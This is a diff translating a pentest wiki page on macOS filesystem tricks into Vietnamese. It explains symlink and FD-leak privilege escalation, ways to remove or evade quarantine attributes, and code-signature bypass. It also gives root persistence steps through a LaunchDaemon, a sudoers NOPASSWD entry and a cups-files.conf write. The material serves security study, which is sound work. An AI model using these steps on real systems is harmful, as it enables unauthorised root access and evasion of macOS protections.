@@ -1,34 +1,34 @@
-# macOS FS Tricks
+# Thủ thuật FS macOS
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-## POSIX permissions combinations
+## Các tổ hợp quyền POSIX
 
-For a **directory**, the three permission bits mean something different from what they mean on a regular file. `chmod(1)` calls the execute bit "**search**" when it is applied to a directory:<sup>[[2]](#references)</sup>
+Đối với **thư mục**, ba bit quyền có ý nghĩa khác với khi áp dụng cho tệp thông thường. `chmod(1)` gọi bit execute là "**search**" khi áp dụng cho thư mục:<sup>[[2]](#references)</sup>
 
-> `0100` For files, allow execution by owner. For directories, allow the owner to **search** in the directory.
+> `0100` Đối với tệp, cho phép chủ sở hữu thực thi. Đối với thư mục, cho phép chủ sở hữu **tìm kiếm** trong thư mục.
 
-- **read** - you can **enumerate** the directory entries (list the names).
-- **write** - you can **create, rename and delete entries** in the directory. Note this is a property of the *containing* directory, not of the file: you can delete a file you cannot read or write, as long as you can write its parent directory.
-  - To delete a **subdirectory** it must be empty, which in turn requires enough rights to remove everything inside it.
-  - If the directory has the **sticky bit** (`S_ISVTX`, like `/tmp`) this is restricted — POSIX states that a process may then remove or rename files in it only if it owns the file, owns the directory, or has appropriate privileges.<sup>[[1]](#references)</sup>
-- **execute / search** - you are **allowed to traverse** the directory. Pathname resolution locates each component "in the directory specified by its predecessor", so **losing search rights on any single component of the path prefix makes everything below it unreachable by path**, even if the leaf file itself is world-readable.<sup>[[1]](#references)</sup>
+- **read** - bạn có thể **liệt kê** các mục trong thư mục (xem tên).
+- **write** - bạn có thể **tạo, đổi tên và xóa các mục** trong thư mục. Lưu ý đây là thuộc tính của thư mục *chứa*, không phải của tệp: bạn có thể xóa một tệp mà mình không thể đọc hoặc ghi, miễn là bạn có quyền ghi vào thư mục cha của tệp đó.
+  - Để xóa một **thư mục con**, thư mục đó phải rỗng, điều này đòi hỏi bạn có đủ quyền để xóa mọi thứ bên trong.
+  - Nếu thư mục có **sticky bit** (`S_ISVTX`, như `/tmp`), quyền này bị hạn chế — POSIX quy định rằng tiến trình chỉ có thể xóa hoặc đổi tên tệp trong đó nếu nó sở hữu tệp, sở hữu thư mục hoặc có đặc quyền phù hợp.<sup>[[1]](#references)</sup>
+- **execute / search** - bạn được **phép đi qua** thư mục. Việc phân giải tên đường dẫn tìm từng thành phần "trong thư mục được thành phần đứng trước nó chỉ định", vì vậy **mất quyền search trên bất kỳ thành phần nào trong tiền tố đường dẫn sẽ khiến mọi thứ bên dưới không thể truy cập qua đường dẫn**, ngay cả khi tệp cuối cùng có quyền đọc cho mọi người.<sup>[[1]](#references)</sup>
 
-### Dangerous Combinations
+### Các tổ hợp nguy hiểm
 
-**How to overwrite a file/folder owned by root**, but:
+**Cách ghi đè tệp/thư mục do root sở hữu**, khi:
 
-- One parent **directory owner** in the path is the user
-- One parent **directory owner** in the path is a **users group** with **write access**
-- A users **group** has **write** access to the **file**
+- **Chủ sở hữu thư mục** cha ở một vị trí bất kỳ trong đường dẫn là người dùng
+- **Chủ sở hữu thư mục** cha ở một vị trí bất kỳ trong đường dẫn là **nhóm người dùng** có **quyền ghi**
+- Một **nhóm người dùng** có quyền **ghi** vào **tệp**
 
-With any of the previous combinations, an attacker could **inject** a **sym/hard link** the expected path to obtain a privileged arbitrary write.
+Với bất kỳ tổ hợp nào ở trên, kẻ tấn công có thể **chèn** một **symlink/hard link** vào đường dẫn dự kiến để thực hiện ghi tùy ý với đặc quyền cao.
 
-### Folder root R+X special case
+### Trường hợp đặc biệt: thư mục root có R+X
 
-This falls straight out of the pathname-resolution rule above. If a **directory only grants R+X to root**, the files inside it are unreachable *by path* for everybody else — but the **files' own permission bits may still be permissive**. The directory is the only thing standing in the way.
+Điều này bắt nguồn trực tiếp từ quy tắc phân giải tên đường dẫn ở trên. Nếu một **thư mục chỉ cấp R+X cho root**, mọi người khác sẽ không thể truy cập các tệp bên trong *qua đường dẫn* — nhưng **các bit quyền của chính tệp vẫn có thể cho phép truy cập rộng rãi**. Thư mục là trở ngại duy nhất.
 
-So any primitive that lets you get the file **out of that directory** — a privileged process that **moves/renames/copies** an attacker-chosen path into a location you *can* traverse — turns into an arbitrary read, without ever needing to defeat the file's own mode:
+Vì vậy, bất kỳ primitive nào giúp đưa tệp **ra khỏi thư mục đó** — chẳng hạn tiến trình có đặc quyền **di chuyển/đổi tên/sao chép** một đường dẫn do kẻ tấn công chọn vào vị trí mà bạn có thể đi qua — đều cho phép đọc tùy ý mà không cần vượt qua quyền của chính tệp:
 
 ```bash
 # Reproduce the primitive locally
@@ -42,31 +42,31 @@ cat /tmp/locked/data.txt     # Permission denied
 sudo ls -l /tmp/locked/
 ```
 
-Look for privileged file movers (installers, log rotators, crash/diagnostic collectors, backup and "export" features) that accept a source path from a lower-privileged user.
+Tìm các chương trình có quyền cao dùng để di chuyển tệp (trình cài đặt, công cụ xoay vòng log, bộ thu thập sự cố/chẩn đoán, tính năng sao lưu và "xuất") chấp nhận đường dẫn nguồn do người dùng có quyền thấp hơn cung cấp.
 
 ## Symbolic Link / Hard Link
 
-### Permissive file/folder
+### Tệp/thư mục có quyền hạn lỏng lẻo
 
-If a privileged process is writing data in **file** that could be **controlled** by a **lower privileged user**, or that could be **previously created** by a lower privileged user. The user could just **point it to another file** via a Symbolic or Hard link, and the privileged process will write on that file.
+Nếu một tiến trình có quyền cao đang ghi dữ liệu vào **tệp** có thể bị **kiểm soát** bởi người dùng có quyền thấp hơn, hoặc có thể đã được người dùng có quyền thấp hơn **tạo từ trước**, thì người dùng đó chỉ cần **trỏ tệp đó đến một tệp khác** thông qua Symbolic Link hoặc Hard Link, và tiến trình có quyền cao sẽ ghi vào tệp đó.
 
-Check in the other sections where an attacker could **abuse an arbitrary write to escalate privileges**.
+Kiểm tra các phần khác để tìm nơi kẻ tấn công có thể **lạm dụng quyền ghi tùy ý để leo thang đặc quyền**.
 
 ### Open `O_NOFOLLOW`
 
-Per [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"If `O_NOFOLLOW` is used in the mask and the target file passed to `open()` is a symbolic link then the `open()` will fail."* Only the **final** component is checked — every **intermediate** component is still resolved and followed. So a developer who "protected" a write with `O_NOFOLLOW` can still be attacked by planting a symlink on any **parent directory** of the target path.<sup>[[3]](#references)</sup>
+Theo [`open(2)`](https://keith.github.io/xcode-man-pages/open.2.html): *"Nếu `O_NOFOLLOW` được dùng trong mask và tệp đích truyền cho `open()` là một symbolic link thì `open()` sẽ thất bại."* Chỉ thành phần **cuối cùng** được kiểm tra — mọi thành phần **trung gian** vẫn được phân giải và theo dấu. Vì vậy, nhà phát triển đã "bảo vệ" thao tác ghi bằng `O_NOFOLLOW` vẫn có thể bị tấn công bằng cách đặt symlink trong bất kỳ **thư mục cha** nào của đường dẫn đích.<sup>[[3]](#references)</sup>
 
-The same man page documents the flags that actually close that gap:<sup>[[3]](#references)</sup>
+Trang man tương tự ghi lại các flag thực sự khắc phục lỗ hổng này:<sup>[[3]](#references)</sup>
 
-- **`O_NOFOLLOW_ANY`** — *"if ... any component of the path passed to `open()` is a symbolic link then the `open()` will fail."*
-- **`O_RESOLVE_BENEATH`** — *"if ... the specified path resolution escapes the directory associated with the fd then the `openat()` will fail."*
+- **`O_NOFOLLOW_ANY`** — *"nếu ... bất kỳ thành phần nào trong đường dẫn truyền cho `open()` là symbolic link thì `open()` sẽ thất bại."*
+- **`O_RESOLVE_BENEATH`** — *"nếu ... quá trình phân giải đường dẫn được chỉ định thoát khỏi thư mục gắn với fd thì `openat()` sẽ thất bại."*
 
-Otherwise, `openat()` relative to a directory FD you already validated, or `realpath()` + re-validation, are the remaining ways to stop mid-path symlink swaps.
+Nếu không, các cách còn lại để ngăn việc thay thế symlink giữa chừng trong đường dẫn là dùng `openat()` tương đối với một directory FD đã được xác thực, hoặc dùng `realpath()` rồi xác thực lại.
 
 ## .fileloc
 
-Files with **`.fileloc`** extension can point to other applications or binaries so when they are open, the application/binary will be the one executed.\
-Example:
+Các tệp có phần mở rộng **`.fileloc`** có thể trỏ đến ứng dụng hoặc binary khác, để khi được mở, ứng dụng/binary đó sẽ được thực thi.\
+Ví dụ:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -81,20 +81,20 @@ Example:
 </plist>
 ```
 
-## File Descriptors
+## Bộ mô tả tệp
 
 ### Leak FD (no `O_CLOEXEC`)
 
-If a call to `open` doesn't have the flag `O_CLOEXEC` the file descriptor will be inherited by the child process. So, if a privileged process opens a privileged file and executes a process controlled by the attacker, the attacker will **inherit the FD over the privileged file**.
+Nếu một lệnh gọi `open` không có cờ `O_CLOEXEC`, file descriptor sẽ được kế thừa bởi tiến trình con. Vì vậy, nếu một tiến trình có đặc quyền mở một tệp có đặc quyền rồi thực thi một tiến trình do kẻ tấn công kiểm soát, kẻ tấn công sẽ **kế thừa FD trỏ đến tệp có đặc quyền**.
 
-The canonical example is the **`DYLD_PRINT_TO_FILE` LPE in OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>
+Ví dụ kinh điển là **LPE `DYLD_PRINT_TO_FILE` trên OS X 10.10** ([SektionEins](https://www.sektioneins.de/en/blog/15-07-07-dyld_print_to_file_lpe.html)):<sup>[[4]](#references)</sup>
 
-- `dyld` honoured `DYLD_PRINT_TO_FILE=/path` even in **restricted (suid root) binaries**, because that particular variable was parsed outside of `processDyldEnvironmentVariable()`.
-- It did `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, so it **created a root-owned file at an arbitrary path**.
-- The FD was **never closed and had no close-on-exec flag**, so every child of the suid binary inherited a **writable FD to a root-owned file**.
-- Running e.g. `DYLD_PRINT_TO_FILE=/etc/target suid_binary` and then reading the inherited FD number in the child gave arbitrary root-owned writes; `fcntl(fd, F_SETFL, 0)` even cleared `O_APPEND` to allow overwriting instead of appending.
+- `dyld` vẫn xử lý `DYLD_PRINT_TO_FILE=/path` ngay cả trong **các binary bị hạn chế (suid root)**, vì biến cụ thể đó được phân tích bên ngoài `processDyldEnvironmentVariable()`.
+- Nó gọi `open(loggingPath, O_WRONLY | O_CREAT | O_APPEND, 0644)`, nên **tạo một tệp thuộc sở hữu của root tại một đường dẫn tùy ý**.
+- FD **không bao giờ được đóng và không có cờ close-on-exec**, vì vậy mọi tiến trình con của binary suid đều kế thừa **FD có quyền ghi vào một tệp thuộc sở hữu của root**.
+- Ví dụ, chạy `DYLD_PRINT_TO_FILE=/etc/target suid_binary`, rồi đọc số FD được kế thừa trong tiến trình con, sẽ cho phép ghi tùy ý vào tệp thuộc sở hữu của root; ngay cả `fcntl(fd, F_SETFL, 0)` cũng xóa `O_APPEND`, cho phép ghi đè thay vì nối thêm.
 
-The same shape shows up whenever a privileged process opens a file **before** `exec`ing something you control (helper tools, `crontab`-style editors invoked through `$EDITOR`, log/debug files opened from an env-var path...). Enumerate the FDs you inherited with:
+Cơ chế tương tự xuất hiện bất cứ khi nào một tiến trình có đặc quyền mở tệp **trước khi** `exec` thứ gì đó do bạn kiểm soát (công cụ trợ giúp, trình soạn thảo kiểu `crontab` được gọi thông qua `$EDITOR`, tệp log/debug được mở từ đường dẫn trong biến môi trường...). Liệt kê các FD bạn đã kế thừa bằng:
 
 ```bash
 # From inside the child process
@@ -103,19 +103,19 @@ ls -l /dev/fd/
 lsof -p $$
 ```
 
-Anything above `2` that points to a file you cannot open yourself is an arbitrary-write (or arbitrary-read) primitive.
+Bất kỳ thứ gì lớn hơn `2` trỏ đến một tệp mà bạn không thể tự mở đều là primitive arbitrary-write (hoặc arbitrary-read).
 
-## Avoid quarantine xattrs tricks
+## Tránh các thủ thuật xattrs quarantine
 
-### Remove it
+### Xóa nó
 
 ```bash
 xattr -d com.apple.quarantine /path/to/file_or_app
 ```
 
-### uchg / uchange / uimmutable flag
+### cờ uchg / uchange / uimmutable
 
-If a file/folder has this immutable attribute it won't be possible to put an xattr on it
+Nếu một tệp/thư mục có thuộc tính bất biến này, sẽ không thể gắn xattr lên nó.
 
 ```bash
 echo asd > /tmp/asd
@@ -127,11 +127,11 @@ ls -lO /tmp/asd
 # check the "uchg" in the output
 ```
 
-### File systems without xattr support
+### Hệ thống tệp không hỗ trợ xattr
 
-Not every file system macOS can mount stores **extended attributes** natively. HFS+ and APFS do; **FAT32, exFAT and (most) NFS mounts do not** — macOS emulates them by writing an **AppleDouble** side file named `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>
+Không phải hệ thống tệp nào macOS có thể gắn kết cũng lưu **extended attributes** nguyên bản. HFS+ và APFS có hỗ trợ; **FAT32, exFAT và (hầu hết) các điểm gắn kết NFS thì không** — macOS mô phỏng chúng bằng cách ghi một tệp phụ **AppleDouble** có tên `._<filename>` ([The Eclectic Light Company](https://eclecticlight.co/2018/01/12/which-file-systems-and-cloud-services-preserve-extended-attributes/)).<sup>[[5]](#references)</sup>
 
-That matters for quarantine, because the xattr only survives if it can actually be written **and read back** from the same volume:
+Điều này quan trọng với quarantine, vì xattr chỉ tồn tại nếu có thể thực sự được ghi **và đọc lại** từ cùng một volume:
 
 ```bash
 # Check whether a mount point round-trips xattrs at all
@@ -140,11 +140,11 @@ xattr -p com.apple.quarantine /Volumes/SOMEUSB/file
 ls -a /Volumes/SOMEUSB/          # look for the ._file AppleDouble companion
 ```
 
-If the volume is later read on a path that ignores the `._` companion (or the companion is stripped/deleted), the file arrives **without a quarantine flag** — and an unquarantined `.app` is enough to escape the App Sandbox, as covered in [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).
+Nếu volume sau đó được đọc từ một đường dẫn bỏ qua companion `._` (hoặc companion này bị loại bỏ/xóa), file sẽ đến **mà không có cờ quarantine** — và một `.app` không bị quarantine là đủ để thoát khỏi App Sandbox, như đã trình bày trong [macOS Sandbox Debug & Bypass](../macos-sandbox/macos-sandbox-debug-and-bypass/README.md#bypassing-quarantine-attribute).
 
 ### writeextattr ACL
 
-This ACL prevents from adding `xattrs` to the file
+ACL này ngăn việc thêm `xattrs` vào file.
 
 ```bash
 rm -rf /tmp/test*
@@ -169,13 +169,13 @@ ls -le /tmp/test
 
 ### **com.apple.acl.text xattr + AppleDouble**
 
-**AppleDouble** file format copies a file including its ACEs.
+Định dạng tệp **AppleDouble** sao chép một tệp cùng với các ACE của tệp đó.
 
-In the [**source code**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html) it's possible to see that the ACL text representation stored inside the xattr called **`com.apple.acl.text`** is going to be set as ACL in the decompressed file. So, if you compressed an application into a zip file with **AppleDouble** file format with an ACL that prevents other xattrs to be written to it... the quarantine xattr wasn't set into de application:
+Trong [**mã nguồn**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html), có thể thấy biểu diễn ACL dạng văn bản được lưu bên trong xattr có tên **`com.apple.acl.text`** sẽ được đặt làm ACL cho tệp đã giải nén. Vì vậy, nếu bạn nén một ứng dụng vào tệp zip theo định dạng **AppleDouble** với ACL ngăn các xattr khác được ghi vào đó... thì xattr quarantine sẽ không được đặt cho ứng dụng:
 
-Check the [**original report**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) for more information.<sup>[[6]](#references)</sup>
+Xem [**báo cáo gốc**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/) để biết thêm thông tin.<sup>[[6]](#references)</sup>
 
-To replicate this we first need to get the correct acl string:
+Để tái hiện việc này, trước tiên chúng ta cần lấy chuỗi ACL chính xác:
 
 ```bash
 # Everything will be happening here
@@ -195,24 +195,24 @@ ditto -x -k --rsrc test.zip .
 ls -le test
 ```
 
-(Note that even if this works the sandbox write the quarantine xattr before)
+(Lưu ý rằng ngay cả khi cách này hoạt động, sandbox vẫn ghi quarantine xattr trước đó)
 
-Not really needed but I leave it there just in case:
+Không thực sự cần thiết, nhưng tôi vẫn để đó phòng trường hợp cần:
 
 
 {{#ref}}
 macos-xattr-acls-extra-stuff.md
 {{#endref}}
 
-## Bypass signature checks
+## Bypass kiểm tra chữ ký
 
-### Bypass platform binaries checks
+### Bypass kiểm tra platform binaries
 
-Some security checks check if the binary is a **platform binary**, for example to allow to connect to a XPC service. However, as exposed in on bypass in https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/ it's possible to bypass this check by getting a platform binary (like /bin/ls) and inject the exploit via dyld using en env variable `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>
+Một số kiểm tra bảo mật xác minh binary có phải là **platform binary** hay không, ví dụ để cho phép kết nối tới một XPC service. Tuy nhiên, như được trình bày trong bài viết https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/, có thể bypass bước kiểm tra này bằng cách lấy một platform binary (chẳng hạn /bin/ls) rồi inject exploit thông qua dyld bằng biến môi trường `DYLD_INSERT_LIBRARIES`.<sup>[[7]](#references)</sup>
 
-### Bypass flags `CS_REQUIRE_LV` and `CS_FORCED_LV`
+### Bypass các flag `CS_REQUIRE_LV` và `CS_FORCED_LV`
 
-It's possible for an executing binary to modify it's own flags to bypass checks with a code such as:<sup>[[7]](#references)</sup>
+Một binary đang chạy có thể sửa các flag của chính nó để bypass bước kiểm tra, bằng đoạn code như sau:<sup>[[7]](#references)</sup>
 
 ```c
 // Code from https://jhftss.github.io/A-New-Era-of-macOS-Sandbox-Escapes/
@@ -231,9 +231,9 @@ NSLog(@"=====Inject successfully into %d(%@), csflags=0x%x", pid, exePath, statu
 
 ## Bypass Code Signatures
 
-Bundles contains the file **`_CodeSignature/CodeResources`** which contains the **hash** of every single **file** in the **bundle**. Note that the hash of CodeResources is also **embedded in the executable**, so we can't mess with that, either.
+Các bundle chứa tệp **`_CodeSignature/CodeResources`**, trong đó có **hash** của từng **tệp** trong **bundle**. Lưu ý rằng hash của CodeResources cũng được **nhúng trong executable**, nên chúng ta cũng không thể chỉnh sửa nó.
 
-However, there are some files whose signature won't be checked, these have the key omit in the plist, like:
+Tuy nhiên, có một số tệp sẽ không được kiểm tra chữ ký; chúng có khóa omit trong plist, chẳng hạn như:
 
 ```xml
 <dict>
@@ -279,7 +279,7 @@ However, there are some files whose signature won't be checked, these have the k
 </dict>
 ```
 
-It's possible to calculate the signature of a resource from the cli with:
+Có thể tính chữ ký của một tài nguyên từ cli bằng:
 
 ```bash
 openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
@@ -287,7 +287,7 @@ openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/
 
 ## Mount dmgs
 
-A user can mount a custom dmg created even on top of some existing folders. This is how you could create a custom dmg package with custom content:
+Người dùng có thể mount một dmg tùy chỉnh được tạo ngay cả trên một số thư mục hiện có. Đây là cách bạn có thể tạo một gói dmg tùy chỉnh với nội dung tùy chỉnh:
 
 ```bash
 # Create the volume
@@ -310,20 +310,20 @@ hdiutil detach /private/tmp/mnt 1>/dev/null
 hdiutil create -srcfolder justsome.app justsome.dmg
 ```
 
-Usually macOS mounts disk talking to the `com.apple.DiskArbitrarion.diskarbitrariond` Mach service (provided by `/usr/libexec/diskarbitrationd`). If adding the param `-d` to the LaunchDaemons plist file and restarted, it will store logs it will store logs in `/var/log/diskarbitrationd.log`.\
-However, it's possible to use tools like `hdik` and `hdiutil` to communicate directly with the `com.apple.driver.DiskImages` kext.
+Thông thường, macOS gắn kết ổ đĩa bằng cách giao tiếp với Mach service `com.apple.DiskArbitrarion.diskarbitrariond` (do `/usr/libexec/diskarbitrationd` cung cấp). Nếu thêm tham số `-d` vào tệp plist của LaunchDaemons rồi khởi động lại, nhật ký sẽ được lưu trong `/var/log/diskarbitrationd.log`.\
+Tuy nhiên, bạn có thể dùng các công cụ như `hdik` và `hdiutil` để giao tiếp trực tiếp với kext `com.apple.driver.DiskImages`.
 
-## Arbitrary Writes
+## Ghi tùy ý
 
-### Periodic sh scripts
+### Các script sh chạy định kỳ
 
-If your script could be interpreted as a **shell script** you could overwrite the **`/etc/periodic/daily/999.local`** shell script that will be triggered every day.
+Nếu script của bạn có thể được diễn giải dưới dạng **shell script**, bạn có thể ghi đè **`/etc/periodic/daily/999.local`**, một shell script sẽ được kích hoạt hằng ngày.
 
-You can **fake** an execution of this script with: **`sudo periodic daily`**
+Bạn có thể **giả lập** việc thực thi script này bằng lệnh: **`sudo periodic daily`**
 
-### Daemons
+### Daemon
 
-Write an arbitrary **LaunchDaemon** like **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`** with a plist executing an arbitrary script like:
+Tạo một **LaunchDaemon** tùy ý, chẳng hạn **`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**, với một plist thực thi script tùy ý như:
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
@@ -342,23 +342,23 @@ Write an arbitrary **LaunchDaemon** like **`/Library/LaunchDaemons/xyz.hacktrick
 </plist>
 ```
 
-Just generate the script `/Applications/Scripts/privesc.sh` with the **commands** you would like to run as root.
+Chỉ cần tạo script `/Applications/Scripts/privesc.sh` với các **commands** bạn muốn chạy dưới quyền root.
 
-### Sudoers File
+### File Sudoers
 
-If you have **arbitrary write**, you could create a file inside the folder **`/etc/sudoers.d/`** granting yourself **sudo** privileges.
+Nếu có **arbitrary write**, bạn có thể tạo một file trong thư mục **`/etc/sudoers.d/`** để cấp cho mình quyền **sudo**.
 
-### PATH files
+### Các file PATH
 
-The file **`/etc/paths`** is one of the main places that populates the PATH env variable. You must be root to overwrite it, but if a script from **privileged process** is executing some **command without the full path**, you might be able to **hijack** it modifying this file.
+File **`/etc/paths`** là một trong những nơi chính dùng để thiết lập biến môi trường PATH. Bạn phải là root để ghi đè file này, nhưng nếu một script từ **process có đặc quyền** chạy một **command không kèm đường dẫn đầy đủ**, bạn có thể **hijack** nó bằng cách sửa đổi file này.
 
-You can also write files in **`/etc/paths.d`** to load new folders into the `PATH` env variable.
+Bạn cũng có thể ghi các file vào **`/etc/paths.d`** để thêm thư mục mới vào biến môi trường `PATH`.
 
 ### cups-files.conf
 
-This technique was used in [this writeup](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>
+Kỹ thuật này đã được sử dụng trong [bài viết này](https://www.kandji.io/blog/macos-audit-story-part1).<sup>[[8]](#references)</sup>
 
-Create the file `/etc/cups/cups-files.conf` with the following content:
+Tạo file `/etc/cups/cups-files.conf` với nội dung sau:
 
 ```
 ErrorLog /etc/sudoers.d/lpe
@@ -366,24 +366,24 @@ LogFilePerm 777
 <some junk>
 ```
 
-This will create the file `/etc/sudoers.d/lpe` with permissions 777. The extra junk at the end is to trigger the error log creation.
+This sẽ tạo file `/etc/sudoers.d/lpe` với quyền 777. Phần nội dung thừa ở cuối nhằm kích hoạt việc tạo error log.
 
-Then, write in `/etc/sudoers.d/lpe` the needed config to escalate privileges like `%staff ALL=(ALL) NOPASSWD:ALL`.
+Sau đó, ghi cấu hình cần thiết để leo thang đặc quyền vào `/etc/sudoers.d/lpe`, chẳng hạn `%staff ALL=(ALL) NOPASSWD:ALL`.
 
-Then, modify the file `/etc/cups/cups-files.conf` again indicating `LogFilePerm 700` so the new sudoers file becomes valid invoking `cupsctl`.
+Tiếp theo, sửa lại file `/etc/cups/cups-files.conf`, đặt `LogFilePerm 700` để file sudoers mới hợp lệ khi gọi `cupsctl`.
 
-### Sandbox Escape
+### Thoát Sandbox
 
-It's posisble to escape the macOS sandbox with a FS arbitrary write. For some examples check the page [macOS Auto Start](../../../../macos-auto-start-locations.md) but a common one is to write a Terminal preferences file in `~/Library/Preferences/com.apple.Terminal.plist` that executes a command at startup and call it using `open`.
+Có thể thoát khỏi macOS sandbox bằng cách ghi tùy ý vào FS. Xem một số ví dụ tại trang [macOS Auto Start](../../../../macos-auto-start-locations.md), nhưng một cách phổ biến là ghi file tùy chọn Terminal vào `~/Library/Preferences/com.apple.Terminal.plist` để chạy lệnh khi khởi động, rồi gọi file đó bằng `open`.
 
-## Generate writable files as other users
+## Tạo file có thể ghi với tư cách người dùng khác
 
-A very common privesc primitive is making a **privileged process create a file for you** in a directory you control, and then keeping **write access** to that file. Two ingredients are needed:
+Một primitive privesc rất phổ biến là khiến **một tiến trình có đặc quyền tạo file cho bạn** trong thư mục bạn kiểm soát, rồi giữ **quyền ghi** vào file đó. Cần có hai yếu tố:
 
-1. A directory you own (or where you can set an **inheritable ACL**), so anything created inside inherits your permissions.
-2. A privileged/`suid` process that can be told **where** to create a file — typically through a debug/logging environment variable, a config file, or a helper's XPC API.
+1. Một thư mục thuộc sở hữu của bạn (hoặc nơi bạn có thể đặt **ACL có thể kế thừa**), để mọi thứ được tạo bên trong đều kế thừa quyền của bạn.
+2. Một tiến trình có đặc quyền/`suid` có thể được chỉ định **nơi** tạo file — thường thông qua biến môi trường debug/logging, file cấu hình hoặc XPC API của một helper.
 
-The **inheritable ACL** part is what makes the created file writable by you even though it is owned by another user. The `file_inherit` / `directory_inherit` inheritance flags are documented in [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>
+Phần **ACL có thể kế thừa** giúp bạn có thể ghi vào file được tạo, dù file thuộc sở hữu của người dùng khác. Các cờ kế thừa `file_inherit` / `directory_inherit` được mô tả trong [`chmod(1)`](https://keith.github.io/xcode-man-pages/chmod.1.html):<sup>[[2]](#references)</sup>
 
 ```bash
 DIRNAME=/tmp/inherit_test
@@ -395,17 +395,17 @@ chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextat
 ls -lde "$DIRNAME"   # confirm the ACE is present
 ```
 
-Now any file that a privileged process creates inside `$DIRNAME` is **writable by you**. If that directory is also a location that is later **executed as root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, a LaunchDaemon directory...), this is a direct root escalation. See the [Sudoers File](#sudoers-file) and [cups-files.conf](#cups-filesconf) sections above for what to write once you have the file.
+Giờ đây, mọi tệp mà một tiến trình có đặc quyền tạo bên trong `$DIRNAME` đều **có thể được bạn ghi vào**. Nếu thư mục đó cũng là nơi sau này được **thực thi với quyền root** (`/etc/periodic/*`, `/etc/cron.d`, `/etc/sudoers.d`, thư mục LaunchDaemon...), đây là cách leo thang đặc quyền trực tiếp lên root. Xem các phần [Sudoers File](#sudoers-file) và [cups-files.conf](#cups-filesconf) ở trên để biết cần ghi gì vào tệp sau khi có được nó.
 
-For a full worked example of the "env variable makes a root process create a file, and the FD leaks to you" chain, see [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) above.
+Để xem ví dụ đầy đủ về chuỗi tấn công "biến môi trường khiến một tiến trình root tạo tệp, rồi FD bị leak cho bạn", hãy xem phần [Leak FD (no `O_CLOEXEC`)](#leak-fd-no-o_cloexec) ở trên.
 
-## POSIX Shared Memory
+## Bộ nhớ chia sẻ POSIX
 
-**POSIX shared memory** allows processes in POSIX-compliant operating systems to access a common memory area, facilitating faster communication compared to other inter-process communication methods. It involves creating or opening a shared memory object with `shm_open()`, setting its size with `ftruncate()`, and mapping it into the process's address space using `mmap()`. Processes can then directly read from and write to this memory area. To manage concurrent access and prevent data corruption, synchronization mechanisms such as mutexes or semaphores are often used. Finally, processes unmap and close the shared memory with `munmap()` and `close()`, and optionally remove the memory object with `shm_unlink()`. This system is especially effective for efficient, fast IPC in environments where multiple processes need to access shared data rapidly.
+**Bộ nhớ chia sẻ POSIX** cho phép các tiến trình trong hệ điều hành tuân thủ POSIX truy cập chung một vùng bộ nhớ, giúp giao tiếp nhanh hơn so với các phương thức giao tiếp liên tiến trình khác. Cách này bao gồm việc tạo hoặc mở một đối tượng bộ nhớ chia sẻ bằng `shm_open()`, đặt kích thước bằng `ftruncate()` và ánh xạ đối tượng vào không gian địa chỉ của tiến trình bằng `mmap()`. Sau đó, các tiến trình có thể đọc và ghi trực tiếp vào vùng bộ nhớ này. Để quản lý truy cập đồng thời và tránh hỏng dữ liệu, thường sử dụng các cơ chế đồng bộ hóa như mutex hoặc semaphore. Cuối cùng, các tiến trình hủy ánh xạ và đóng bộ nhớ chia sẻ bằng `munmap()` và `close()`, đồng thời có thể tùy chọn xóa đối tượng bộ nhớ bằng `shm_unlink()`. Cơ chế này đặc biệt hiệu quả khi cần IPC nhanh, hiệu suất cao trong môi trường có nhiều tiến trình cần truy cập dữ liệu chia sẻ nhanh chóng.
 
 <details>
 
-<summary>Producer Code Example</summary>
+<summary>Ví dụ mã Producer</summary>
 
 ```c
 // gcc producer.c -o producer -lrt
@@ -455,7 +455,7 @@ int main() {
 
 <details>
 
-<summary>Consumer Code Example</summary>
+<summary>Ví dụ về Consumer Code</summary>
 
 ```c
 // gcc consumer.c -o consumer -lrt
@@ -501,23 +501,22 @@ int main() {
 
 ## macOS Guarded Descriptors
 
-**macOSCguarded descriptors** are a security feature introduced in macOS to enhance the safety and reliability of **file descriptor operations** in user applications. These guarded descriptors provide a way to associate specific restrictions or "guards" with file descriptors, which are enforced by the kernel.
+**macOS guarded descriptors** là một tính năng bảo mật được giới thiệu trong macOS nhằm tăng độ an toàn và độ tin cậy cho các thao tác **file descriptor** trong ứng dụng người dùng. Các guarded descriptor này cho phép gắn những hạn chế hoặc “guard” cụ thể với file descriptor, và kernel sẽ thực thi chúng.
 
-This feature is particularly useful for preventing certain classes of security vulnerabilities such as **unauthorized file access** or **race conditions**. These vulnerabilities occurs when for example a thread is accessing a file description giving **another vulnerable thread access over it** or when a file descriptor is **inherited** by a vulnerable child process. Some functions related to this functionality are:
